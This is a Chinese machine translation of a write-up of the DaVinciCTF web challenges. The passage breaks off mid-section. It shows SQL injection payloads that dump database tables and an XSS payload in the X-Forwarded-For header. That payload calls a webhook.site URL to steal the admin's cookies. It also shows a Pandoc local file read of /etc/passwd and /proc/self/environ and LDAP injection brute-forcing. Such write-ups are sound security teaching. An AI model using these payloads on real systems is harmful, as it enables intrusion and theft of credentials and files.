<html>
<head>
<title>DaVinciCTF — Web Challenges — Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">达芬奇密码—网络挑战—详细报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/davincictf-web-challenges-writeup-517e77d6fa39?source=collection_archive---------1-----------------------#2021-03-14">https://infosecwriteups.com/davincictf-web-challenges-writeup-517e77d6fa39?source=collection_archive---------1-----------------------#2021-03-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><figure class="ip iq gp gr ir is gh gi paragraph-image"><div class="gh gi io"><img src="../Images/ddc92219f318c234fb2c7e92e56d1228.png" data-original-src="https://miro.medium.com/v2/resize:fit:1238/format:webp/1*7a8JUBHyTR2ZwAglVK1cUA.png"/></div></figure><div class=""/><p id="fb8f" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这个周末，我有幸扮演达芬奇CTF和我的团队浮士德获得第一名。这是一场非常有趣和高质量的CTF，有一些很好的和创造性的挑战。</p><p id="e05c" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">因为我们解决了所有的挑战，而网络挑战是我最喜欢的类别，所以我决定为他们所有人写文章。挑战是按分数排序的，可以跳过你解决的问题。</p><h1 id="590e" class="ks kt ix bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">混淆-10分和318个解决方案</h1><blockquote class="lq lr ls"><p id="bf1c" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">我的密码是我的秘密。你永远找不到…<br/><a class="ae lx" href="http://challs.dvc.tf:5555/" rel="noopener ugc nofollow" target="_blank">http://challs.dvc.tf:5555/</a><br/>要验证这个挑战，请输入密码作为标志。</p></blockquote><p id="5d21" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我们访问网站时，我们可以看到一个输入字段来提交秘密。由于我们不知道这个秘密，我们首先查看网页的源代码，看到了混淆的Javascript。</p><p id="52d1" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">使用<a class="ae lx" href="http://www.jsnice.org/" rel="noopener ugc nofollow" target="_blank"> JSnice </a>我们可以稍微去掉代码的精华，看到下面的内容。</p><figure class="ly lz ma mb gt is"><div class="bz fp l di"><div class="mc md l"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">去泡沫化的Javascript</figcaption></figure><p id="ada7" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我没有阅读所有的代码，只是尝试了第37/38行中testSecret函数的前两行。结果是国旗，别问我为什么:)</p><p id="ce44" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw iy">dvCTF { 1t _ is _ n0t _ 4 _ secr3t _ 4 nym0r 3 }</strong></p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/7a29f188dce7669fb77467002642cac5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1376/format:webp/1*enV0NX-gw7hjAIF3XwC-Ig.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">当在控制台中尝试此功能时，它会返回标志</figcaption></figure><h1 id="214a" class="ks kt ix bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">认证— 10分和265个解决方案</h1><blockquote class="lq lr ls"><p id="a7c3" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">你能找到一种认证管理员的方法吗？<br/><a class="ae lx" href="http://challs.dvc.tf:1337/" rel="noopener ugc nofollow" target="_blank">http://challs.dvc.tf:1337/</a></p></blockquote><p id="0954" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">第二个挑战是SQLi挑战。我们可以看到一个登录页面，目标是以管理员身份登录。</p><p id="ebd7" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当然，我们可以尝试各种SQLi技术，但是在这里，第一个SQLi教科书式的利用已经起作用了:<em class="lt">或1==1 - </em>作为用户名，我们作为管理员登录。</p><p id="fba5" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在网页上，我们没有看到标志，所以我们用<em class="lt"> ctrl-u </em>打开该页面的源代码，并在页面底部找到作为隐藏字段的标志。</p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="e004" class="mo kt ix mk b gy mp mq l mr ms">&lt;p style="visibility: hidden;"&gt;dvCTF{!th4t_w4s_34sy!}&lt;/p&gt;</span></pre><h1 id="1f09" class="ks kt ix bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">成员-66分和61个解决方案</h1><blockquote class="lq lr ls"><p id="8bc2" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">你能得到更多关于成员的信息吗？<a class="ae lx" href="http://challs.dvc.tf:1337/members" rel="noopener ugc nofollow" target="_blank">http://challs.dvc.tf:1337/members</a></p></blockquote><p id="5545" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">跟进认证挑战，在挑战<em class="lt">成员</em>中，我们需要获得关于成员的更多信息。这听起来又像是一个SQLi挑战。</p><p id="4fb6" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我们访问会员页面时，我们可以看到一个搜索栏和所有列出的会员。</p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi mt"><img src="../Images/a9c63db106a71e09b517e0acdebc2d89.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oWqOl4owi2jwAW2XQ0w4Lw.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">该页面显示一个搜索字段和所有成员</figcaption></figure><p id="16bc" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如果我们将搜索查询留空，我们将看到所有成员，否则它会过滤名称。</p><p id="47b6" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们尝试了一些SQLi有效负载，以查看简单的UNION SELECT能够工作并给出结果。<a class="ae lx" href="https://www.w3schools.com/sql/sql_union.asp" rel="noopener ugc nofollow" target="_blank">联合选择</a>用于合并两个或多个选择的结果。因为x没有给出结果，所以返回1，1，1作为结果，并验证SQLi。</p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="bb3b" class="mo kt ix mk b gy mp mq l mr ms">x" UNION SELECT 1,1,1; --</span></pre><figure class="ly lz ma mb gt is gh gi paragraph-image"><div class="gh gi my"><img src="../Images/a4fda4b7265f3f847432efe84a5678b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*3-lb7M8GnIBTfVlCPSrM9g.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">选择作为PoC的简单联合</figcaption></figure><p id="027f" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">考虑到这一点，我们寻找可能是MySQL的数据库引擎。</p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/25cb16270b67a87fe005f27db28bac8e.png" data-original-src="https://miro.medium.com/v2/resize:fit:872/format:webp/1*fl4fydDuvze0Y-jscSKzQQ.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">一个简单的联合选择泄漏数据库版本</figcaption></figure><p id="9761" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">然后我们列出了所有的表和列，看到有一个名为<em class="lt"> supa_secret_table </em>的表带有列标志。</p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="0aa6" class="mo kt ix mk b gy mp mq l mr ms">x" UNION SELECT COLUMN_NAME, TABLE_NAME,table_schema FROM INFORMATION_SCHEMA.COLUMNS; --</span></pre><figure class="ly lz ma mb gt is gh gi paragraph-image"><div class="gh gi na"><img src="../Images/73c137d6c85c865901296fa107322cc8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1362/format:webp/1*_iMc0byw-QMcJ75DR-9C6A.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">所有表和列的摘录</figcaption></figure><p id="caa7" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">快速查询之后，我们收到了标志:<strong class="jw iy">dvCTF { 1 _ h0p 3 _ u _ D1 DNT _ us3 _ sqlm4p }</strong></p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="4332" class="mo kt ix mk b gy mp mq l mr ms">x" UNION SELECT id, flag, id from supa_secret_table --</span></pre><figure class="ly lz ma mb gt is gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/ee26a3cdddcd3cd98bc1025dfdffdc8d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1014/format:webp/1*WaVCaqfFZ0IMl0k4oAXXDg.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">接收标志的简单联合选择</figcaption></figure><h1 id="7462" class="ks kt ix bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">高安全性— 200分和13个解决方案</h1><blockquote class="lq lr ls"><p id="e2c6" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">您现在可以看到谁试图连接到您的帐户。什么会出错？【http://challs.dvc.tf:65535/ T4】</p></blockquote><p id="865d" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我们开始这项挑战时，已经是深夜了，我们已经很累了。我们花了一轮好觉才解决。</p><p id="742f" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">与上一个挑战一样，我们又有了一个登录页面。只有这一次，我们可以注册一个用户。代替路径<em class="lt">/成员</em>，这次我们有了<em class="lt">/安全</em>。安全页面显示一个空表，其中包含IP和时间列。</p><p id="d04c" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">由于描述告诉我们，当有人试图登录我们的帐户时，我们可以看到，我们试图用假密码登录我们的帐户。瞧——一个条目出现在表格中，显示我的IP地址(这显然不是我的)和时间戳。</p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nc"><img src="../Images/9f6c11bbf6bf9528e7970ea32a434ea3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*huBPpZgzcCurwt6p9EXlPQ.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">下表显示了试图闯入您帐户的人的IP地址</figcaption></figure><p id="1bb3" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">然后，我们尝试用<em class="lt"> X-Forwarded-For </em>报头来更改我们的IP地址，并且成功了。以下请求导致IP 1.2.3.4出现在我们的表中。</p><figure class="ly lz ma mb gt is"><div class="bz fp l di"><div class="mc md l"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">X-Forwarded-For PoC请求</figcaption></figure><p id="9ec5" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">接下来，我们在报头中放置了XSS有效载荷，而不是IP，然后弹出了一个好的旧警报。</p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="0477" class="mo kt ix mk b gy mp mq l mr ms">X-Forwarded-For: &lt;script&gt;alert(1)&lt;/script&gt;</span></pre><figure class="ly lz ma mb gt is gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nd"><img src="../Images/bcd40474c7fe3ef954aa3b0ff4c170d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xvncWE3ct6hW0wwtXWdm0A.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">XSS工作顺利</figcaption></figure><p id="7e73" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">因为我们有XSS，我们猜测一定有一个管理员用户，我们可以用我们的漏洞攻击。因此，我们向admin发送了与上面相同的请求和以下标题:</p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="6771" class="mo kt ix mk b gy mp mq l mr ms">X-Forwarded-For: &lt;script&gt;fetch("https://webhook.site/968b79da-73da-426b-9a06-37c50cddb45a");&lt;/script&gt;</span></pre><p id="72b8" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">有效载荷在我们这边工作，但不幸的是，我们没有收到来自管理员的任何请求。</p><p id="1143" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">经过一些思考和尝试不同的管理员名称，我们得出的结论是，这必须是正确的方式，必须有一个管理员用户利用，我们只是做错了一些事情。</p><p id="a2e7" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在继续之前，我们在Discord上给一个dvCTF管理员发了消息，询问是否有一个管理员用户，如果有，他是否停机了。管理员验证了一个管理员用户存在并为他工作。</p><p id="c266" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们尝试的另一个有效载荷显示确实有一个管理员用户。使用下面的有效负载，管理用户<em class="lt"> admin </em>从我们的URL请求一个图像。唯一的问题是我们不能执行Javascript和过滤数据。</p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="22e6" class="mo kt ix mk b gy mp mq l mr ms">X-Forwarded-For: &lt;img src="https://webhook.site/968b79da-73da-426b-9a06-37c50cddb45a" /&gt;</span></pre><figure class="ly lz ma mb gt is gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi ne"><img src="../Images/e8e139a9ad368bddc32186b01e4e311d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5TqNXWuZ7M47dQ21nvp13g.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">使用我们的URL作为图像源，我们收到来自用户admin的请求</figcaption></figure><p id="bfd1" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们尝试了各种有效载荷和想法，但没有成功。最后，我们决定睡一觉，第二天早上再试试。</p><p id="02e7" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">第二天早上，一位同事通知我们，管理员使用了PhantomJS，正如你在用户代理中看到的，PhantomJS不支持<em class="lt">获取</em>。我们应该尝试一下古老的XMLHttpRequest……有时候你太累了，以至于不想想显而易见的解决方案。</p><p id="8cd9" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最后，我们向管理员发送了一个请求，通过X-Forward-For头中的XSS加载更多的Javascript代码。加载的有效负载将用户的cookies发送回给我们。于是，我们收到了标志:<strong class="jw iy"> dvCTF{xss_l0ve &lt; 3} </strong></p><figure class="ly lz ma mb gt is"><div class="bz fp l di"><div class="mc md l"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">这是对管理员的最后请求</figcaption></figure><figure class="ly lz ma mb gt is"><div class="bz fp l di"><div class="mc md l"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">这是我们网址上的有效负载</figcaption></figure><figure class="ly lz ma mb gt is gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/b36c3d2d438e65bb95dc71102ef46708.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fdKuOrjnTogJfaLaQ60KFg.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">我们从管理员那里收到的请求包含该标志</figcaption></figure><h1 id="5a9d" class="ks kt ix bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">家庭作业——400分和4个答案</h1><blockquote class="lq lr ls"><p id="b5f5" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">我的电脑太慢了，我做了一个网站把我的作业编辑成pdf格式。安全吗？<br/><a class="ae lx" href="http://challs.dvc.tf:6666/" rel="noopener ugc nofollow" target="_blank">http://challs.dvc.tf:6666/</a></p></blockquote><p id="4fff" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这个挑战很特别。起初，它被列为100分，然而，一天后没有人解决它，所以管理员决定增加到400分。</p><p id="52c8" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">此外，这是EPT团队和我的团队必须解决的最后一个挑战。谁先解决它，谁就能成为第一名，赢得CTF奖。这非常令人兴奋，最终，我们在EPT前两个小时解决了这个问题。事实上，0d12245589甚至在我们之前就解决了这个问题，但解决的其他挑战太少，无法超越我们。</p><p id="2efa" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">总之，回到挑战！</p><p id="5fc1" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当跟随链接时，我们得到一个ERR_UNSAFE_PORT。稍微搜索一下就会发现端口6666是不安全的，必须手动允许。在Chrome中，这可以通过选项<code class="fe ng nh ni mk b">—explicitly-allowed-ports=6666</code>实现，在Firefox中，我们可以在about:config中添加值为6666的选项<em class="lt">。</em></p><p id="c5dc" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">之后，我们可以看到一个主页，上面有一个输入框，用来输入我们的作业。</p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/97a629d882f8fae533eabe9458f89169.png" data-original-src="https://miro.medium.com/v2/resize:fit:832/format:webp/1*QHGYumJfdCCgjIcMjDWidg.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">网页有一个输入字段</figcaption></figure><p id="672e" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如果我们输入Markdown或HTML，它会呈现为HMTL。例如，在下面的示例中:</p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="657a" class="mo kt ix mk b gy mp mq l mr ms"># Hello World<br/>* foo<br/>* bar<br/>* bla</span></pre><figure class="ly lz ma mb gt is gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/275d2d21153c6d4eebdaf71ea0f1e955.png" data-original-src="https://miro.medium.com/v2/resize:fit:366/format:webp/1*zDz1IgR6PD4HKsqtxo2uAg.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">呈现主页的结果</figcaption></figure><p id="dde2" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们很快发现它是用网页源代码中的<a class="ae lx" href="https://github.com/jgm/pandoc" rel="noopener ugc nofollow" target="_blank"> Pandoc </a>渲染的，我们可以输入一个外部源来包含在渲染输出中。例如，如果我们提交一个带有受控URL的脚本标签，我们可以在服务器的响应中看到URL的内容。这意味着请求发生在服务器上，而不是客户端。<a class="ae lx" href="https://pandoc.org/MANUAL.html" rel="noopener ugc nofollow" target="_blank"> Pandoc文档</a>将此称为<code class="fe ng nh ni mk b">— self-contained</code>选项。</p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nl"><img src="../Images/c6972dcda42b68503de81a5d9e576012.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y2M0txdmroqTOglAqSoMhA.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">我们可以在服务器的响应中看到我们URL的Hello Wolrd内容</figcaption></figure><p id="98a6" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">了解了这一点，我们尝试用file:// scheme加载本地文件。但是，服务器总是会响应一个错误。</p><p id="673f" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">直到一个同事尝试添加类型属性<code class="fe ng nh ni mk b">type="text/plain"</code>并得到一个结果。有了这个属性和正确的来源，我们就能够排除<em class="lt"> /etc/passwd </em>。</p><p id="cb56" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><code class="fe ng nh ni mk b">&lt;script type="text/plain" src="file:/etc/passwd"&gt;&lt;/script&gt;</code></p><pre class="ly lz ma mb gt mj mk ml mm aw mn bi"><span id="4ef8" class="mo kt ix mk b gy mp mq l mr ms">root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>docker:x:1000:1000::/home/docker:/bin/sh<br/>homework:x:1001:1001:,,,:/home/homework:/bin/bash</span></pre><p id="b825" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">从这里，我们看着<code class="fe ng nh ni mk b">/proc/self/environ</code>来列出环境变量。</p><figure class="ly lz ma mb gt is"><div class="bz fp l di"><div class="mc md l"/></div></figure><p id="b6ca" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">从环境变量中，我们可以看到一些有趣的目录来搜索标志。最后，标志在<code class="fe ng nh ni mk b">/app/flag</code>:<strong class="jw iy">dvCTF { r _ markd 0wn _ 1s _ c00l }</strong></p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nm"><img src="../Images/6d3fd6fade1c41046362c1dd14395034.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9xFOJiJzMI4vZbI3NringA.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">我们收到旗帜的最后一个请求</figcaption></figure><h1 id="5fdf" class="ks kt ix bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">轻量级——497分，12次解围</h1><blockquote class="lq lr ls"><p id="706f" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">我的公司让我写一个登录页面来验证LDAP。你能以管理员身份认证吗？<br/><a class="ae lx" href="http://challs.dvc.tf:8080/" rel="noopener ugc nofollow" target="_blank">http://challs.dvc.tf:8080/</a></p></blockquote><p id="333c" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在这个挑战中，我们有一个LDAP注入，因为挑战描述已经给了我们提示。因此，在登录页面上，我们首先尝试了一些LDAP注入负载，这导致了一些不错的PHP错误消息。</p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nn"><img src="../Images/b5c1d9419c5d20ff8beadc49baf1ff54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YvEdybkjsG-2cr1FNS1BjA.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">右括号中断了LDAP过滤器</figcaption></figure><p id="e3df" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以看到右括号破坏了LDAP过滤器，因此我们可以注入更多的过滤器。</p><p id="f761" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">此外，当我们点击<em class="lt">我们的团队</em>时，网页告诉我们他们有四个用户，三个开发人员和一个管理员。</p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi no"><img src="../Images/40fac2a8606e6776c47432e7a004cc81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XxI4lQEK67wSPgngo5hDew.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">该网页有三个开发人员和一个管理员</figcaption></figure><p id="0132" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在对给定的电子邮件和其他输入进行了一些尝试后，我们得出结论，我们可以获得三个输出:</p><ol class=""><li id="3cfa" class="np nq ix jw b jx jy kb kc kf nr kj ns kn nt kr nu nv nw nx bi translated">错误消息“没有这样的用户！”当请求是正确的，但是LDAP没有找到具有给定过滤器的用户时。比如找不到邮箱foo@bar.de。</li><li id="6dd4" class="np nq ix jw b jx ny kb nz kf oa kj ob kn oc kr nu nv nw nx bi translated">错误消息“用户名/密码无效！”当请求正确且LDAP找到了用户，但我们的密码不正确时。例如，电子邮件jdoe@dvctf.local就可以了。</li><li id="71d6" class="np nq ix jw b jx ny kb nz kf oa kj ob kn oc kr nu nv nw nx bi translated">错误消息“用户名/密码无效！”加上请求中断时的PHP错误消息。例如右括号。</li></ol><p id="bd41" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">此时，我们在LDAP请求中注入了一个新的过滤器，并强制用户描述作为概念证明。</p><figure class="ly lz ma mb gt is"><div class="bz fp l di"><div class="mc md l"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">注入的过滤器返回“无效的用户名/密码！”因为使用此过滤器找到了用户，但密码不正确</figcaption></figure><p id="34b3" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在下面的例子中，我使用打嗝闯入者一个接一个地尝试所有可能的描述。你可以看到，我之前找到了描述<em class="lt"> sysa </em>，请求显示下一个字母是<em class="lt"> d </em>。最后描述会是<em class="lt"> sysadmin </em>。</p><figure class="ly lz ma mb gt is gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi od"><img src="../Images/669ecdd2dc4f6954b33f8fb75d1d8c0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RIFHYX1em1GdHW2ai2DfGg.png"/></div></div></figure><p id="512e" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi 